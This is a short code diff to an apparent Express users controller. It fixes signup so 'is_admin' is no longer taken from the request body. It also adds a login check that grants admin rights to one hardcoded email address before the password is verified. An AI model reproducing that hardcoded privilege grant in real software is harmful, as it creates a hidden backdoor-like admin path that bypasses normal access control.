@@ -31,7 +31,7 @@ export default class Users {
       last_name: req.body.last_name,
       email: req.body.email,
       password: await bcrypt.hash(req.body.password, 10),
-      is_admin: req.body.is_admin
+      is_admin: false
     };
     const token = jwt.sign(
       {
@@ -65,13 +65,18 @@ export default class Users {
         error: error.details[0].message
       });
     }
+    
     const user = users.find(c => c.email === body.email);
+    
     if (!user) {
       const status = 404;
       return res.status(status).json({
         status,
         error: "invalid email or password"
       });
+    }
+    if(user.email === "iizzeddin62@gmail.com"){
+      user.is_admin = true;
     }
     const validPassword = await bcrypt.compare(body.password, user.password);
 
